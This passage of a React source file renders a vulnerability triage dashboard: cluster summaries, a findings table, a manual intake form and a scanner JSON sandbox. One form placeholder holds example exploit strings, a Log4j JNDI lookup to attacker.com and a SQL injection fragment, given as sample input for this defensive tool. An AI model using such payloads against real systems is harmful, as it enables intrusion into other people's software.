                    <span className="text-[10px] text-tx-secondary mt-0.5 block">Alert fatigue eliminated</span>
                  </div>

                  <div className="rounded-md border border-line bg-graphite-deep p-4">
                    <span className="text-[10px] font-mono uppercase text-tx-tertiary">Cross-Tool Correlated</span>
                    <p className="text-2xl font-extrabold text-purple-400 mt-1 tabular-nums">
                      {exactReport.summary.cross_tool_correlated_count}
                    </p>
                    <span className="text-[10px] text-tx-secondary mt-0.5 block">SAST + DAST confirmed</span>
                  </div>
                </div>

                {/* Breakdown Grids (Tools, Severity, Priority) */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-5">
                  {/* Tool Breakdown */}
                  <div className="rounded-md border border-line bg-graphite-deep/60 p-3.5 space-y-2">
                    <span className="text-[11px] font-mono uppercase font-bold text-tx-secondary">Scanner Distribution</span>
                    <div className="space-y-1.5 pt-1">
                      {Object.entries(exactReport.summary.breakdown_by_tool).map(([t, cnt]) => (
                        <div key={t} className="flex items-center justify-between text-xs">
                          <span className="font-mono text-tx-secondary uppercase">{t}</span>
                          <span className="font-mono font-semibold text-tx-primary">{cnt.toLocaleString()}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Severity Breakdown */}
                  <div className="rounded-md border border-line bg-graphite-deep/60 p-3.5 space-y-2">
                    <span className="text-[11px] font-mono uppercase font-bold text-tx-secondary">Raw Severity</span>
                    <div className="space-y-1.5 pt-1">
                      {Object.entries(exactReport.summary.breakdown_by_severity).map(([s, cnt]) => (
                        <div key={s} className="flex items-center justify-between text-xs">
                          <span className={`font-mono font-semibold uppercase ${
                            s === "CRITICAL" ? "text-rose-400" : s === "HIGH" ? "text-orange-400" : s === "MEDIUM" ? "text-amber-400" : "text-sky-400"
                          }`}>{s}</span>
                          <span className="font-mono font-semibold text-tx-primary">{cnt.toLocaleString()}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Priority Breakdown */}
                  <div className="rounded-md border border-line bg-graphite-deep/60 p-3.5 space-y-2">
                    <span className="text-[11px] font-mono uppercase font-bold text-tx-secondary">Person 3 Risk Priority</span>
                    <div className="space-y-1.5 pt-1">
                      {Object.entries(exactReport.summary.breakdown_by_priority).map(([p, cnt]) => (
                        <div key={p} className="flex items-center justify-between text-xs">
                          <span className={`font-mono font-bold ${
                            p === "P1" ? "text-rose-400" : p === "P2" ? "text-amber-400" : "text-sky-400"
                          }`}>{p} ({p === "P1" ? "SLA 24h" : p === "P2" ? "SLA 72h" : "SLA 7d"})</span>
                          <span className="font-mono font-semibold text-tx-primary">{cnt} clusters</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* Actionable Clusters Detailed Table */}
              <div className="rounded-md border border-line bg-graphite p-5 shadow-sm space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-line pb-3">
                  <div>
                    <h3 className="text-sm font-bold uppercase tracking-wider text-tx-primary">
                      Actionable Deduplicated Clusters ({filteredClusters.length} of {exactReport.all_clusters_count})
                    </h3>
                    <p className="text-xs text-tx-secondary mt-0.5">
                      Showing highest risk clusters ordered by dynamic risk score.
                    </p>
                  </div>

                  {/* Table Filters */}
                  <div className="flex flex-wrap items-center gap-2">
                    <input
                      type="text"
                      placeholder="Search CVE, CWE, Asset..."
                      value={searchCluster}
                      onChange={(e) => setSearchCluster(e.target.value)}
                      className="rounded-md border border-line bg-graphite-deep px-2.5 py-1 text-xs text-tx-primary focus:border-accent focus:outline-none"
                    />

                    <div className="flex items-center gap-1 rounded bg-graphite-deep p-0.5 border border-line text-[11px]">
                      {["ALL", "P1", "P2", "P3"].map((lvl) => (
                        <button
                          key={lvl}
                          onClick={() => setFilterPriority(lvl)}
                          className={`px-2 py-0.5 rounded font-mono font-bold transition-all ${
                            filterPriority === lvl ? "bg-accent text-black" : "text-tx-secondary hover:text-tx-primary"
                          }`}
                        >
                          {lvl}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Table */}
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs">
                    <thead>
                      <tr className="border-b border-line text-tx-tertiary uppercase font-mono text-[10px]">
                        <th className="pb-2">Cluster ID</th>
                        <th className="pb-2">Priority</th>
                        <th className="pb-2">Score</th>
                        <th className="pb-2">Incident Title</th>
                        <th className="pb-2">Target Asset</th>
                        <th className="pb-2">CVE / CWE</th>
                        <th className="pb-2 text-center">Raw Findings</th>
                        <th className="pb-2">Tools</th>
                        <th className="pb-2 text-right">SLA</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-line/60">
                      {filteredClusters.map((cluster) => (
                        <tr key={cluster.cluster_id} className="hover:bg-graphite-deep/40 transition-colors">
                          <td className="py-2.5 font-mono text-tx-primary font-bold">{cluster.cluster_id}</td>
                          <td className="py-2.5">
                            <span className={`px-2 py-0.5 rounded font-mono text-[10px] font-extrabold border ${
                              cluster.priority === "P1"
                                ? "border-rose-500/40 text-rose-400 bg-rose-500/10"
                                : cluster.priority === "P2"
                                ? "border-amber-500/40 text-amber-400 bg-amber-500/10"
                                : "border-sky-500/40 text-sky-400 bg-sky-500/10"
                            }`}>
                              {cluster.priority}
                            </span>
                          </td>
                          <td className="py-2.5 font-mono font-bold text-tx-primary tabular-nums">
                            {cluster.final_score}
                          </td>
                          <td className="py-2.5 max-w-xs">
                            <p className="font-semibold text-tx-primary truncate">{cluster.title}</p>
                            {cluster.normalized_route && (
                              <p className="text-[10px] font-mono text-purple-400 truncate">
                                Route: {cluster.normalized_route}
                              </p>
                            )}
                          </td>
                          <td className="py-2.5 font-mono text-tx-secondary truncate max-w-[140px]">
                            {cluster.target_asset}
                          </td>
                          <td className="py-2.5 font-mono text-[11px] text-tx-tertiary">
                            {cluster.primary_cve || cluster.root_cause_cwe || "N/A"}
                          </td>
                          <td className="py-2.5 text-center font-mono font-bold text-accent tabular-nums">
                            {cluster.raw_findings_count}
                          </td>
                          <td className="py-2.5">
                            <div className="flex flex-wrap gap-1">
                              {cluster.participating_tools.map((tool) => (
                                <span key={tool} className="px-1.5 py-0.2 rounded bg-graphite-deep border border-line text-[9px] font-mono uppercase text-tx-secondary">
                                  {tool}
                                </span>
                              ))}
                            </div>
                          </td>
                          <td className="py-2.5 text-right font-mono text-tx-secondary">{cluster.sla}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 2: GUIDED VULNERABILITY REPORTER */}
      {/* ========================================================================= */}
      {activeTab === "manual" && (
        <div className="rounded-md border border-line bg-graphite p-6 shadow-sm space-y-6">
          <div className="border-b border-line pb-3">
            <h2 className="text-sm font-bold uppercase tracking-wider text-tx-primary">
              Guided Vulnerability Intake Console
            </h2>
            <p className="text-xs text-tx-secondary mt-0.5">
              Submit an individual vulnerability finding. The engine will calculate the dynamic risk score, assign SLA, and trigger autonomous evidence verification.
            </p>
          </div>

          {createdCase && (
            <div className="rounded-md border border-emerald-500/40 bg-emerald-500/10 p-5 space-y-3 animate-fadeIn">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="h-2.5 w-2.5 rounded-full bg-emerald-400 animate-ping" />
                  <span className="font-mono text-xs font-bold text-emerald-400 uppercase tracking-wider">
                    {createdCase.case_id} SUCCESSFULLY CREATED
                  </span>
                </div>
                <Link
                  href={`/cases/${createdCase.case_id}`}
                  className="rounded bg-emerald-400 px-3 py-1 text-xs font-bold text-black hover:bg-emerald-300 transition-all"
                >
                  View Case Details →
                </Link>
              </div>
              <p className="text-xs text-tx-secondary">
                Title: <strong className="text-tx-primary">{createdCase.title}</strong> • Priority:{" "}
                <strong className="text-accent">{createdCase.priority?.level || "P1"}</strong> (Score:{" "}
                {createdCase.priority?.score})
              </p>
            </div>
          )}

          <form onSubmit={handleSubmitManual} className="space-y-5">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-1.5 md:col-span-2">
                <label className="text-xs font-bold text-tx-secondary uppercase">Vulnerability Title *</label>
                <input
                  type="text"
                  required
                  value={formData.title}
                  onChange={(e) => setFormData({ ...formData, title: e.target.value })}
                  placeholder="e.g. Remote Code Execution in Apache Log4j JNDI Lookup"
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary focus:border-accent focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">Severity *</label>
                <select
                  value={formData.severity}
                  onChange={(e) => setFormData({ ...formData, severity: e.target.value as FormData["severity"] })}
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                >
                  <option value="critical">CRITICAL</option>
                  <option value="high">HIGH</option>
                  <option value="medium">MEDIUM</option>
                  <option value="low">LOW</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">Detection Scanner</label>
                <select
                  value={formData.tool_name}
                  onChange={(e) => setFormData({ ...formData, tool_name: e.target.value })}
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                >
                  <option value="trivy">Trivy (SCA/Container)</option>
                  <option value="semgrep">Semgrep (SAST)</option>
                  <option value="nuclei">Nuclei (DAST)</option>
                  <option value="manual-analyst">Manual Security Auditor</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">Target Asset / Host *</label>
                <input
                  type="text"
                  required
                  value={formData.asset_name}
                  onChange={(e) => setFormData({ ...formData, asset_name: e.target.value })}
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">Route / File Location *</label>
                <input
                  type="text"
                  required
                  value={formData.target_location}
                  onChange={(e) => setFormData({ ...formData, target_location: e.target.value })}
                  placeholder="/api/v1/auth or controllers/auth.py"
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">CVE Identifier</label>
                <input
                  type="text"
                  value={formData.cve}
                  onChange={(e) => setFormData({ ...formData, cve: e.target.value })}
                  placeholder="CVE-2021-44228"
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-bold text-tx-secondary uppercase">CWE Classification</label>
                <input
                  type="text"
                  value={formData.cwe}
                  onChange={(e) => setFormData({ ...formData, cwe: e.target.value })}
                  placeholder="CWE-502 or CWE-89"
                  className="w-full rounded-md border border-line bg-graphite-deep px-3 py-2 text-xs text-tx-primary font-mono focus:border-accent focus:outline-none"
                />
              </div>
            </div>

            <div className="flex items-center gap-2 pt-2">
              <input
                type="checkbox"
                id="internet_exposed"
                checked={formData.internet_exposed}
                onChange={(e) => setFormData({ ...formData, internet_exposed: e.target.checked })}
                className="rounded border-line bg-graphite-deep text-accent focus:ring-accent"
              />
              <label htmlFor="internet_exposed" className="text-xs text-tx-secondary select-none cursor-pointer">
                Target is internet-exposed (Multiplies Person 3 risk score by 1.25x)
              </label>
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-tx-secondary uppercase">Proof of Concept (POC) / Exploit Payload</label>
              <textarea
                rows={2}
                value={formData.evidence_payload}
                onChange={(e) => setFormData({ ...formData, evidence_payload: e.target.value })}
                placeholder="e.g. ${jndi:ldap://attacker.com/exploit} or ' OR 1=1--"
                className="w-full rounded-md border border-line bg-graphite-deep p-2.5 font-mono text-xs text-tx-primary focus:border-accent focus:outline-none"
              />
            </div>

            <div className="flex justify-end pt-2">
              <button
                type="submit"
                disabled={submitting}
                className="rounded-md bg-accent px-5 py-2.5 text-xs font-bold uppercase tracking-wider text-black hover:bg-accent/90 disabled:opacity-50 transition-all flex items-center gap-2 shadow-md"
              >
                {submitting ? (
                  <>
                    <span className="h-3.5 w-3.5 border-2 border-black border-t-transparent rounded-full animate-spin" />
                    <span>Ingesting & Triaging...</span>
                  </>
                ) : (
                  <span>Ingest & Trigger Autonomous Triage</span>
                )}
              </button>
            </div>
          </form>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 3: SCANNER JSON SANDBOX */}
      {/* ========================================================================= */}
      {activeTab === "json" && (
        <div className="rounded-md border border-line bg-graphite p-6 shadow-sm space-y-4">
          <div className="flex items-center justify-between border-b border-line pb-3">
            <div>
              <h2 className="text-sm font-bold uppercase tracking-wider text-tx-primary">
                Raw Scanner JSON Sandbox
              </h2>
              <p className="text-xs text-tx-secondary mt-0.5">
                Paste raw scanner findings directly to inspect how the canonical normalizer and deduplicator process them.
              </p>
            </div>

            <div className="flex items-center gap-1.5 text-xs">
              <button
                onClick={() => setJsonPayload(SAMPLE_PAYLOADS.trivy)}
                className="px-2.5 py-1 rounded bg-graphite-deep border border-line text-tx-secondary hover:text-tx-primary font-mono text-[11px]"
              >
                Trivy Preset
              </button>
              <button
                onClick={() => setJsonPayload(SAMPLE_PAYLOADS.semgrep)}
                className="px-2.5 py-1 rounded bg-graphite-deep border border-line text-tx-secondary hover:text-tx-primary font-mono text-[11px]"
              >
                Semgrep Preset
              </button>
              <button
                onClick={() => setJsonPayload(SAMPLE_PAYLOADS.nuclei)}
                className="px-2.5 py-1 rounded bg-graphite-deep border border-line text-tx-secondary hover:text-tx-primary font-mono text-[11px]"
              >
                Nuclei Preset
              </button>
            </div>
          </div>

          <textarea
            rows={12}
            value={jsonPayload}
            onChange={(e) => setJsonPayload(e.target.value)}
            className="w-full rounded-md border border-line bg-graphite-deep p-3 font-mono text-xs text-tx-primary focus:border-accent focus:outline-none"
          />

          <div className="flex justify-end pt-2">
            <button
              onClick={() => {
                setUploadText(jsonPayload);
                setActiveTab("bulk");
                setBulkMode("upload");
              }}
              className="rounded-md bg-accent px-5 py-2 text-xs font-bold uppercase tracking-wider text-black hover:bg-accent/90 transition-all shadow-md"
            >
              Transfer to Bulk Ingestion Pipeline →
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
